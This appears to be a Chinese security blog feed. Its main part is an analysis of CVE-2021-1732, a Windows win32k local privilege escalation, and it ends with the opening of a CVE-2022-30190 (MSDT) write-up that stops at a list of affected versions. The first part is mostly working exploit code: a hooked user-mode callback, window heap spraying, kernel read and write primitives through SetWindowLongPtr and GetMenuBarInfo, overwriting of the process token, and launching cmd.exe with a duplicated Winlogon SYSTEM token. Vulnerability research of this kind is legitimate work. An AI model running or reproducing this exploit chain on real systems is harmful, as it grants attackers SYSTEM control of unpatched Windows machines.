<pre class="line-numbers language-none"><code class="language-none">VOID WINAPI UserModeCallback_Proxy(ULONG_PTR Para1, ULONG_PTR Para2, ULONG_PTR Para3, ULONG_PTR Para4)
{
	ULONG_PTR ulConsoleInfo[0x2] = { 0 };//调用NtUserConsoleControl需要构造0x10长度的参数
	ULONG_PTR ulRetBuffer[0x3] = { 0 };//调用NtCallbackReturn需要构造0x18长度的参数
	ULONG ulCurWnd = (ULONG)SprayWndHandles[SPRAY_WND_COUNT / 2];
	ULONG_PTR ulWndObjOff = 0x0;

	printf("UserMode Callback: %llx %llx %llx %llx\n", Para1, Para2, Para3, Para4 );
	printf( "Current window is Handle %X\n",  ulCurWnd);

	// since it was freed and occupied again , so the index increase one, details see my blog's article!
	{
		USHORT usHigh = (ulCurWnd &gt;&gt; 0x10) &amp; 0xffff;
		USHORT usLow = ulCurWnd &amp; 0xffff;
		ulCurWnd = ((usHigh + 1) &lt;&lt; 0x10) | usLow;
		//ulCurWnd是通过sprayHandle拿到的即将创建的窗口句柄值
	}

	DEBUG_BREAK();

	ulWndObjOff = GetWndObjOffset(ulCurWnd);
	printf("Current Window Object relative to DesktopHeap's offset:%X\n", ulWndObjOff);
	
	// trigle to change flag 
	ulConsoleInfo[0] = ulCurWnd;
	NtUserConsoleControl(0x6, (PVOID)&amp;ulConsoleInfo, sizeof(ulConsoleInfo));
	//对tagWND-&gt;flag设置0x800属性
	ulRetBuffer[0] = ulWndObjOff;
	NtCallbackReturn(&amp;ulRetBuffer, sizeof(ulRetBuffer), 0x0);
	// hook: call origin function, in this case, don't need, due to USER32!_xxxClientAllocWindowClassExtraBytes's internal call NtCallbackReturn
	//UserModeCallback_Orig(Para1, Para2, Para3, Para4);
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="SprayHandler"><a href="#SprayHandler" class="headerlink" title="SprayHandler"></a>SprayHandler</h3><p>创建大量窗口堆后销毁尽量靠中的窗口，再创建一个窗口桌面堆会优先使用休闲的空间，由于之前创建的窗口挤压了堆空间，可以大概率获得原来销毁的窗口，根据窗口句柄生成的规律预知构造一个即将创建的窗口的句柄表示我们现在创建的窗口。</p>
<p><strong>利用SprayHandle的条件：</strong></p>
<p>1.创建足够多的窗口压缩堆空间，在下次调用的时候优先调用之前使用过的休闲空间。</p>
<p>2.对窗口句柄进行规律构造，生成即将生成的窗口句柄，在尚未创建窗口前就使用某写只要调用句柄的API</p>
<pre class="line-numbers language-none"><code class="language-none">if (RegistWndClass(CLS_NAME) ) {
	for (int i = 0; i &lt; SPRAY_WND_COUNT; i++) {
		SprayWndHandles[i] = CreateWnd(CLS_NAME);
	}
	//挤压分配堆空间
	printf("SprayWndHandles[%x] == %X \n", SPRAY_WND_COUNT / 2, SprayWndHandles[SPRAY_WND_COUNT / 2]);
	DestroyWindow(SprayWndHandles[SPRAY_WND_COUNT/2]);//摧毁靠中的窗口，释放这个窗口下属的堆块
	SetHook((PVOID)(pUserModeCallbackTable[CALLBACK_INDEX]), UserModeCallback_Proxy, reinterpret_cast&lt;PVOID*&gt;(&amp;UserModeCallback_Orig));
	//创建一个新窗口触发Hook载入flag 0x800属性
	HWND hTargetWnd = CreateWnd(CLS_NAME);
	printf("hTargetWnd == %X\n", hTargetWnd);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>释放的堆块是大范围正在利用堆中的唯一空闲堆，所以知道分配的规律就能继续利用这个堆块。</p>
<pre class="line-numbers language-none"><code class="language-none">	{
		USHORT usHigh = (ulCurWnd &gt;&gt; 0x10) &amp; 0xffff;
		USHORT usLow = ulCurWnd &amp; 0xffff;
		ulCurWnd = ((usHigh + 1) &lt;&lt; 0x10) | usLow;
		//ulCurWnd是通过sprayHandle拿到的即将创建的窗口句柄值
	}
HWND CreateWnd( PCTSTR ClsName ) {
	return CreateWindowEx(NULL, ClsName, WND_NAME, NULL, 0, 0, 0, 0, NULL, NULL, GetModuleHandle(NULL), NULL);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="HMVaildateHandle获取hwnd句柄地址"><a href="#HMVaildateHandle获取hwnd句柄地址" class="headerlink" title="HMVaildateHandle获取hwnd句柄地址"></a>HMVaildateHandle获取hwnd句柄地址</h3><p>HMAllocObject创建了桌面堆类型句柄后，会把tagWND对象放入到内核模式到用户模式内存映射的地址里，为了验证句柄的有效性，窗口管理器会调用User32!HMVaildateHandle函数读取这个表，将函数句柄和句柄类型作为参数，并在句柄中查找对应的向，查找到对象返回tagWND只读映射的对象指针，通过tagWND这个对象获取到句柄和窗口信息。使用IsMenu第一个call定位函数</p>
<pre class="line-numbers language-none"><code class="language-none">using HMVALIDATEHANDLE = VOID* (WINAPI*)(HWND hwnd, int type);
HMVALIDATEHANDLE HMValidateHandle = NULL;
//定义HMVALIDATEHANDLE类型结构体装在HMValidateHandle函数
BOOL FindHMValidateHandle() {//找到HMValidateHandle
	HMODULE hUser32 = LoadLibraryA("user32.dll");
	if (hUser32 == NULL) {
		printf("Failed to load user32");
		return FALSE;
	}
	BYTE* pIsMenu = (BYTE*)GetProcAddress(hUser32, "IsMenu");
	if (pIsMenu == NULL) {
		printf("Failed to find location of exported function 'IsMenu' within user32.dll\n");
		return FALSE;
	}
	unsigned int uiHMValidateHandleOffset = 0;
	for (unsigned int i = 0; i &lt; 0x1000; i++) {
		BYTE* test = pIsMenu + i;
		if (*test == 0xE8) {
			uiHMValidateHandleOffset = i + 1;
			break;
		}
	}
	if (uiHMValidateHandleOffset == 0) {
		printf("Failed to find offset of HMValidateHandle from location of 'IsMenu'\n");
		return FALSE;
	}

	unsigned int addr = *(unsigned int*)(pIsMenu + uiHMValidateHandleOffset);
	unsigned int offset = ((unsigned int)pIsMenu - (unsigned int)hUser32) + addr;

	HMValidateHandle = (HMVALIDATEHANDLE)((ULONG_PTR)hUser32 + offset + 11);//找HMValidateHandle基址
	return TRUE;
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>利用HMVaildateHandle寻找hwnd句柄地址</p>
<pre class="line-numbers language-none"><code class="language-none">pCurWndObj = HMValidateHandle((HWND)hwnd, 0x1);	<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="tagWND与桌面堆基址偏移计算"><a href="#tagWND与桌面堆基址偏移计算" class="headerlink" title="tagWND与桌面堆基址偏移计算"></a>tagWND与桌面堆基址偏移计算</h3><pre class="line-numbers language-none"><code class="language-none">ULONG GetWndObjOffset(ULONG_PTR hwnd ) {
	PVOID pCurWndObj = NULL;
	ULONG_PTR ulWndObjOff = 0x0;
	ULONG_PTR ulTebAddr = 0;

	ulTebAddr = __readgsqword(0x30);//获取teb基址

	pCurWndObj = HMValidateHandle((HWND)hwnd, 0x1);					//利用HMValidateHandle寻找句柄地址，桌面窗口固定参数是0x1
	ulWndObjOff = (ULONG_PTR)pCurWndObj - *(ULONG_PTR*)(ulTebAddr + TEB_DESKTOPHEAP_OFF);//窗口tagWND相对用户层桌面堆地址偏移
	return ulWndObjOff;//返回窗口hTargetWnd与进程用户堆基址偏移
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>得到tagWND与用户进程桌面堆地址偏移后，就知道内核层窗口tagWND地址</p>
<h3 id="Write-Primitive"><a href="#Write-Primitive" class="headerlink" title="Write Primitive"></a>Write Primitive</h3><p>SetWindowLongPtr:任意地址写入</p>
<p>SetWindowLong:任意地址写入</p>
<p>NtCallbackReturn:自定义offset(pExtraBytes)</p>
<p>NtUserConsoleControl:设置flag</p>
<p>在flag | 0x800 + 载入的自定义pExtraBytes下调用SetWindowLong/SetWindowLongStr,可以进行任意地址写入。</p>
<p>写入的长度有cbWndExtra长度限制，需要先设置足够大的cbWndExtra</p>
<pre class="line-numbers language-none"><code class="language-none">SetWindowLongPtr(hTargetWnd, TAGWND_BODY_EXTRA_SIZE_OFF, (ULONG_PTR)-1);//修改cbWNDExtra
SetWindowLong(hAdjacentWnd, 0x498 + 0x30, 0x7);//hAdjacentWnd窗口中的pExtraBytes作为offset自定义写入<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h3 id="Read-Primitive"><a href="#Read-Primitive" class="headerlink" title="Read Primitive"></a>Read Primitive</h3><p>使用写原语将自定义的用户层spmenu载入内核层tagWND-&gt;spmenu,使用GetMenuBarInfo读取。通过GetMenuBarInfo信息泄露指定地址数据。</p>
<pre class="line-numbers language-none"><code class="language-none">ULONG_PTR ReadPrimitive( HWND TargetWnd ) {
	MENUBARINFO menuBarInfo;
	ULONG_PTR ulValue0, ulValue1;

	menuBarInfo.cbSize = sizeof(menuBarInfo);//menuBarInfo初始化
	GetMenuBarInfo(TargetWnd, OBJID_MENU, 0x1, &amp;menuBarInfo);

	ReBuildData(&amp;menuBarInfo, &amp;ulValue0, &amp;ulValue1);
	//将调用GetMenuBarInfo返回的menuBarInfo中的4字节RECT.left和4字节RECT.top
	return ulValue0;
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>将从泄露的2个32位地址的RECT.left和RECT.right重构64位地址</p>
<pre class="line-numbers language-none"><code class="language-none">VOID ReBuildData( PMENUBARINFO MenuBarInfoPtr, ULONG_PTR* RetValue0, ULONG_PTR* RetValue1 ) {
	ULONG_PTR ulValue0 = MAKE_64BIT_VALUE((ULONG)(MenuBarInfoPtr-&gt;rcBar.top), (ULONG)(MenuBarInfoPtr-&gt;rcBar.left));
	*RetValue0 = ulValue0;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><strong>menuBarInfo结构体</strong></p>
<pre class="line-numbers language-none"><code class="language-none">typedef struct tagMENUBARINFO
{
    DWORD cbSize;
    RECT rcBar;          // rect of bar, popup, item    &lt;===这个就是泄露地址的结构体成员
    HMENU hMenu;         // real menu handle of bar, popup
    HWND hwndMenu;       // hwnd of item submenu if one
    BOOL fBarFocused:1;  // bar, popup has the focus
    BOOL fFocused:1;     // item has the focus
    BOOL fUnused:30;     // reserved
} MENUBARINFO, *PMENUBARINFO, *LPMENUBARINFO;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">ULONG_PTR GetCurThreadObjAddr() {
   HANDLE hThread = INVALID_HANDLE_VALUE;
   ULONG_PTR ulAddr = 0x0;
   hThread = OpenThread(THREAD_QUERY_INFORMATION, FALSE, GetCurrentThreadId());
   if (hThread != INVALID_HANDLE_VALUE){
      ulAddr = (ULONG_PTR)GetTargetHandleObject(GetCurrentProcessId(), (ULONG_PTR)hThread);
      CloseHandle(hThread);
      return ulAddr;
   }
   return 0;
}
//==========================================================================
{
ULONG_PTR ulDesktopHeapBase = 0x0;
ULONG_PTR ulFakeHandle = 0xFFFF;
ULONG_PTR ulFakeRefCount[2] = { 0 };
PULONG_PTR pFakeMenu = NULL;
PULONG_PTR pFakeMenuBody = NULL;
PULONG_PTR pFakeItems = NULL;
PVOID pCurWndObj1 = NULL;

SetWindowLong(hTargetWnd, TAGWND_BODY_STYLE_OFF, 0x40c00000); 
//将自定义的spmenu载入到tagWND-&gt;spmenu要调用SetWindowLongPtr中的xxxSetWindowData
//而调用xxxSetWindowData，需要tagWNDk-&gt;style包含WPCCHILD

pFakeMenu = (PULONG_PTR)VirtualAlloc(NULL, 0x100, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
pFakeMenuBody = (PULONG_PTR)VirtualAlloc(NULL, 0x100, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
pFakeItems = (PULONG_PTR)VirtualAlloc(NULL, 0x100, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
//给各个自定义结构申请内存

SetWindowLongPtr(hTargetWnd, GWLP_ID, (LONG_PTR)pFakeMenu); 
//当参数2为WS_CHILD时，我们才可以调用SetWindowLongPtr将参数3指定的地址(pFakeMenu)写入到tagWND-&gt;spmenu



SetWindowLong(hTargetWnd, TAGWND_BODY_STYLE_OFF, 0x04c00000); 
// 载入spmenu后就style就不需要为0x40c00000了，style需要恢复原数据

// 构造符合正常执行GetMenuBarInfo且把pFakeItems当作读取地址的spmenu
pFakeMenu[0] = (ULONG_PTR)&amp;ulFakeHandle;
pFakeMenu[5] = (ULONG_PTR)pFakeMenuBody;                // fake body
((PULONG)(&amp;pFakeMenuBody[5]))[1] = 0xffff;              // make items count to max
((PULONG)(&amp;pFakeMenu[8]))[0] = 1;                       // make menu'x to 1，这是构造正常的spmenu必须的参数
((PULONG)(&amp;pFakeMenu[8]))[1] = 1;                       // make menu'y to 1，这是构造正常的spmenu必须的参数
pFakeMenu[0xb] = (ULONG_PTR)pFakeItems;                 // 这个就是读取的地址（详情看GetMenuBarInfo分析）
ulFakeRefCount[0] = (ULONG_PTR)pFakeMenu;
pFakeMenu[0x13] = (ULONG_PTR)&amp;ulFakeRefCount;

//开始一步一步根据内核结构联系拿到内核桌面堆地址
{
    ULONG_PTR ulAddr = 0; 
    ULONG_PTR ulValue = 0;

    ulAddr = GetCurThreadObjAddr();
    if (!ulAddr)
        return -1;

    pFakeItems[0] = (ULONG_PTR)(ulAddr + ETHREAD_WIN32THREAD_OFF - 0x40);   // 泄露地址-0x40
    ulValue = 0;
    ulValue = ReadPrimitive(hTargetWnd);

    pFakeItems[0] = (ULONG_PTR)(ulValue - 0x40);            
    ulValue = 0;
    ulValue = ReadPrimitive(hTargetWnd);

    pFakeItems[0] = (ULONG_PTR)(ulValue + WIN32THREAD_DESKTOP_OFF - 0x40);
    ulValue = 0;
    ulValue = 0;
    ulValue = ReadPrimitive(hTargetWnd);

    pFakeItems[0] = (ULONG_PTR)(ulValue + DESKTOP_HEAPBASE_OFF - 0x40);
    ulValue = 0;
    ulValue = ReadPrimitive(hTargetWnd);

    ulDesktopHeapBase = ulValue;    //内核桌面堆地址
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>spmenu是通过分析GetMenuBarInfo得到的与正常spmenu结构有差异的自定义spmenu，pFakeItems是需要泄露的指针，只要自定义pFakeItems，就可以将根读取到内核桌面堆地址。</p>
<h3 id="寻找相邻窗口"><a href="#寻找相邻窗口" class="headerlink" title="寻找相邻窗口"></a>寻找相邻窗口</h3><pre class="line-numbers language-none"><code class="language-none">//找相邻端口
for (ULONG ulIndex = 0x0; ulIndex &lt; 0x30; ulIndex += 8) {
pFakeItems[0] = (ULONG_PTR)(ulDesktopHeapBase + ulWndOffset + ulTagWndBodySize + ulIndex - 0x40);
//两个相邻的窗口地址差是一个tagWNDK结构体大小，循环计数来偏差定位
ulValue = 0;
ulValue = ReadPrimitive(hTargetWnd);
//tagWNDK首地址内容是相邻窗口句柄值
if (ulValue == (ULONG_PTR)hAdjacentWnd) {
bAdjacent = TRUE;
ulTagWndBodySize += ulIndex;
break;
}
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ulDesktopHeapBase + ulWndOffset表示目标窗口在内核层的地址</p>
<p>目标窗口已经将tagWND空间偏移设置为pExtraBytes,在相邻窗口可以配置进程Token空间偏移作为pExtraBytes对进程Token空间进行读写。</p>
<h3 id="使用DataOnlyAttack进行提权"><a href="#使用DataOnlyAttack进行提权" class="headerlink" title="使用DataOnlyAttack进行提权"></a>使用DataOnlyAttack进行提权</h3><p>win10 1708之后，不仅需要修改当前进程特权，还需要调整当前token中的UserAndGroups和管理员相同，才能发生提权。</p>
<pre class="line-numbers language-none"><code class="language-none">ULONG_PTR GetCurTokenObjAddr() {    //获取进程的Token地址
    HANDLE hProc; //进程句柄
    HANDLE hToken; //进程的令牌句柄
    PVOID pTokenObj;

    hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, GetCurrentProcessId());

    OpenProcessToken(
        hProc,
        TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY,
        &amp;hToken);
    pTokenObj = GetTargetHandleObject(GetCurrentProcessId(), (ULONG_PTR)hToken);
    return (ULONG_PTR)pTokenObj;
    //返回Token地址 
}

if (bAdjacent) {
        // read adjacent hwnd's flag
        pFakeItems[0] = (ULONG_PTR)(ulDesktopHeapBase + ulWndOffset + ulTagWndBodySize + TAGWND_BODY_REL_FLAG_OFF - 0x40);  //这里是查看相邻窗口tagWNDk的flag的值
        ulValue = 0;
        ulValue = ReadPrimitive(hTargetWnd);

        ulTokenObjAddr = GetCurTokenObjAddr();//进程的Token地址

        SetWindowLongPtr(hTargetWnd, TAGWND_BODY_EXTRA_SIZE_OFF, (ULONG_PTR)-1); //将cbWndExtra修改到最高
        SetWindowLongPtr(hTargetWnd, ulTagWndBodySize + TAGWND_BODY_REL_FLAG_OFF, ulValue | 0x800); //配置相邻窗口的flag值存在0x800属性
        //配置相邻窗口的flag存在0x800属性
        SetWindowLongPtr(hTargetWnd, ulTagWndBodySize + TAGWND_BODY_REL_VALUE_OFF, ulTokenObjAddr - ulDesktopHeapBase); //将进程token地址-内核桌面堆地址的偏移量放到相邻窗口的pExtraBytes
        //配置相邻窗口的pExtraBytes为
        SetWindowLongPtr(hTargetWnd, ulTagWndBodySize + TAGWND_BODY_EXTRA_SIZE_OFF, (ULONG_PTR)-1); //将相邻窗口的cbWndExtra修改到最高
        //配置相邻窗口的cbWndExtra

        // adjacent wnd can modify token's anything
        SetWindowLongPtr(hAdjacentWnd, 0x40, (ULONG_PTR)-1);
        SetWindowLongPtr(hAdjacentWnd, 0x48, (ULONG_PTR)-1);

        SetWindowLong(hAdjacentWnd, 0x498 + 0x30, 0x7);
        SetWindowLong(hAdjacentWnd, 0x498 + 0x40, 0xf);
        DEBUG_BREAK();

        // Restore adjacent window
        pFakeItems[0] = (ULONG_PTR)(ulDesktopHeapBase + ulWndOffset + ulTagWndBodySize + TAGWND_BODY_REL_FLAG_OFF - 0x40);
        ulValue = 0;
        ulValue = ReadPrimitive(hTargetWnd);
        SetWindowLongPtr(hTargetWnd, ulTagWndBodySize + TAGWND_BODY_REL_FLAG_OFF, ulValue &amp; ~0x800);        //删除相邻窗口的flag的0x800属性
        SetWindowLongPtr(hTargetWnd, ulTagWndBodySize + TAGWND_BODY_REL_VALUE_OFF, 0);
        SetWindowLongPtr(hTargetWnd, ulTagWndBodySize + TAGWND_BODY_EXTRA_SIZE_OFF, 0x100 );                // our specified size
        SetWindowLongPtr(hTargetWnd, TAGWND_BODY_EXTRA_SIZE_OFF, 0x100);                                    // out specified size
    }
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="创建拷贝进程token的cmd进程"><a href="#创建拷贝进程token的cmd进程" class="headerlink" title="创建拷贝进程token的cmd进程"></a>创建拷贝进程token的cmd进程</h3><pre class="line-numbers language-none"><code class="language-none">BOOL GetProIDByName(PCWCHAR ImageName, ULONG_PTR* ProcIDPtr)
{
	HANDLE hSnapshot = INVALID_HANDLE_VALUE;
	PROCESSENTRY32 pe32;

	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE)
		return FALSE;

	pe32.dwSize = sizeof(pe32);

	if (Process32First(hSnapshot, &amp;pe32))
	{
		do {
			if (lstrcmpi(ImageName, pe32.szExeFile) == 0)
			{
				CloseHandle(hSnapshot);
				*ProcIDPtr = pe32.th32ProcessID;
				return TRUE;
			}
		} while (Process32Next(hSnapshot, &amp;pe32));
	}

	CloseHandle(hSnapshot);
	return FALSE;
}

VOID CreateEopProc() {
	HANDLE hProc;
	HANDLE hToken;
	HANDLE hEopToken;
	ULONG_PTR ulWinlogonPID = 0;

	if (!GetProIDByName(L"Winlogon.exe", &amp;ulWinlogonPID) || !ulWinlogonPID)
		return;

	hProc = OpenProcess(
		PROCESS_QUERY_INFORMATION,
		FALSE,
		ulWinlogonPID );

	OpenProcessToken(
		hProc,
		TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY,
		&amp;hToken);


	SECURITY_IMPERSONATION_LEVEL seImpersonateLevel = SecurityImpersonation;
	TOKEN_TYPE tokenType = TokenPrimary;
	if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, seImpersonateLevel, tokenType, &amp;hEopToken))
		return;

	/* Starts a new process with SYSTEM token */
	STARTUPINFOW si = {};
	PROCESS_INFORMATION pi = {};
	CreateProcessWithTokenW(
		hEopToken,
		LOGON_NETCREDENTIALS_ONLY,
		L"C:\\Windows\\System32\\cmd.exe",
		NULL,
		CREATE_NEW_CONSOLE,
		NULL,
		NULL,
		&amp;si,
		&amp;pi)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="恢复环境"><a href="#恢复环境" class="headerlink" title="恢复环境"></a>恢复环境</h3><p>需要还原所有使用SetWindowLong/SetWindowLongStr修改的数据</p>
<pre class="line-numbers language-none"><code class="language-none">pFakeItems[0] = (ULONG_PTR)(ulDesktopHeapBase + ulWndOffset + ulTagWndBodySize + TAGWND_BODY_REL_FLAG_OFF - 0x40);  //这里是查看相邻窗口tagWNDk的flag的值
ulValue = 0;
ulValue = ReadPrimitive(hTargetWnd);
//这里读取相邻窗口上的flag数据（准备被删除0x800属性）

SetWindowLongPtr(hTargetWnd, ulTagWndBodySize + TAGWND_BODY_REL_FLAG_OFF, ulValue &amp; ~0x800);        
//删除相邻窗口的flag的0x800属性
SetWindowLongPtr(hTargetWnd, ulTagWndBodySize + TAGWND_BODY_REL_VALUE_OFF, 0);
// 将相邻窗口的扩展内存设置为0
SetWindowLongPtr(hTargetWnd, ulTagWndBodySize + TAGWND_BODY_EXTRA_SIZE_OFF, 0x100 );                
//相邻窗口开始定义窗口的cbWndExtra
SetWindowLongPtr(hTargetWnd, TAGWND_BODY_EXTRA_SIZE_OFF, 0x100);                                    
//目标窗口开始定义窗口的cbWndExtra

{
ULONG_PTR ulWndOffset = 0x0;
ULONG_PTR ulValue = 0x0;

ulWndOffset = GetWndObjOffset((ULONG_PTR)hTargetWnd);

pFakeItems[0] = (ULONG_PTR)(ulDesktopHeapBase + ulWndOffset + TAGWND_BODY_REL_FLAG_OFF - 0x40);
ulValue = 0;
ulValue = ReadPrimitive(hTargetWnd);
//这里读取到目标窗口上的flag数据（准备被删除0x800属性）


SetWindowLongPtr(hTargetWnd, GWLP_ID, 0x0);
// 将目标窗口载入的Spmenu设置为0
SetWindowLong(hTargetWnd, TAGWND_BODY_STYLE_OFF, 0x04c00000);
// 将目标窗口中的style还原
SetWindowLongPtr(hTargetWnd, TAGWND_BODY_REL_FLAG_OFF, ulValue &amp; ~0x800);
// 将目标窗口中的flag删除0x800属性
SetWindowLongPtr(hTargetWnd, TAGWND_BODY_REL_VALUE_OFF, 0);
// 将目标窗口的扩展内存设置为0
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="0x03-补丁分析"><a href="#0x03-补丁分析" class="headerlink" title="0x03 补丁分析"></a>0x03 补丁分析</h2><p>补丁打在了win32kfull!xxxCreateWindowEx</p>
<p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220809111624710.png"></p>
]]></content>
      <categories>
        <category>CVE</category>
      </categories>
      <tags>
        <tag>CVE</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2022-30190 MSDT远程代码注入漏洞分析</title>
    <url>/2023/04/16/CVE-2022-30190%20MSDT%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h2 id="相关知识"><a href="#相关知识" class="headerlink" title="相关知识"></a>相关知识</h2><h4 id="WTP框架"><a href="#WTP框架" class="headerlink" title="WTP框架"></a>WTP框架</h4><p>windows疑难解答平台（WTP）为ISV、OEM和管理员提供了疑难解答包的过程，这些包用于发现和解决计算机上的问题。WTP框架提供自动化检测修复方式。</p>
<h4 id="底层结构"><a href="#底层结构" class="headerlink" title="底层结构"></a>底层结构</h4><img src="/2023/04/16/CVE-2022-30190%20MSDT%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220816150216855.png" alt="image-20220816150216855" style="zoom: 67%;">

<ul>
<li>WTP由两个进程组成，Process1是带UI的Troubleshooting Run-time Engine，Process2用于提供window PowerShell Runtime环境。</li>
<li>Process2提供的PowerShell运行时环境提供了4条特殊的PowerShell命令：Get-DiagInput、Update-DiagReport、Update-DiagRootCause、Write-DiagProgress</li>
<li>Troubleshooting Pack运行在Process1和Process2所构建的平台上。</li>
</ul>
<h4 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h4><ul>
<li><p>故障排除包是用户可编程部分，本质上是一组针对特定故障的检测修复脚本。Process1(Troubleshooting Run-time Engine)通过故障排除包获取检测脚本检测问题，查出问题交给Process2(PowerShell)运行处理。</p>
</li>
<li><p>Process1是msdt.exe，Process2是sdiagnhost.exe</p>
</li>
<li><p>sdiagnhost.exe为了给msdt.exe提供运行脚本的能力，注册了IScriptedDiagnosticHost com接口，相应的com方法是RunScript()</p>
</li>
<li><p>故障排除包的设计基于三个步骤：检测问题（troubleshooting）、解决问题（resolution）和验证解决方案（verificationg），对应TS、RS、VF三种脚本。</p>
</li>
</ul>
<h4 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h4><p>WTP提供了一系列默认故障排除包，可以在ms-msdt协议里通过-id参数指定。</p>
<p>CVE-2022-30190使用PCWDiagnostic，用于程序兼容性故障排除。</p>
<h2 id="0x00-漏洞描述"><a href="#0x00-漏洞描述" class="headerlink" title="0x00 漏洞描述"></a>0x00 漏洞描述</h2><p>Microsoft Office MSDT存在远程代码执行漏洞，攻击者可以利用Office文件中的远程模块功能，访问远程服务器上挂载的恶意HTML文件，之后通过ms-msdt URL来执行恶意powershell代码，漏洞在宏被禁用的情况下依然可以利用。</p>
<h2 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="0x01 漏洞分析"></a>0x01 漏洞分析</h2><p>CVE-2022-30190本质上是PowerShell代码注入漏洞。MSDT和Powershell的C:\Windows\diagnostics\system\PCW\TS_ProgramCompatibilityWizard.ps1脚本交互，相关的IT_BrowseForFile参数存在命令注入，最终的调用PowerShell动态执行。</p>
<p><strong>影响版本：</strong></p>
<pre class="line-numbers language-none"><code class="language-none">Microsoft Windows Server 2008 SP2
Microsoft Windows 11
Microsoft Windows Server 2019
Microsoft Windows 10 1607
Microsoft Windows Server 20H2
Microsoft Windows Server 2022
Microsoft Windows Server 2016 (Server Core installation)
Microsoft Windows Server 2016 null
Microsoft Windows 10
Microsoft Windows 10 1809
Microsoft Windows Server 2008 R2 SP1
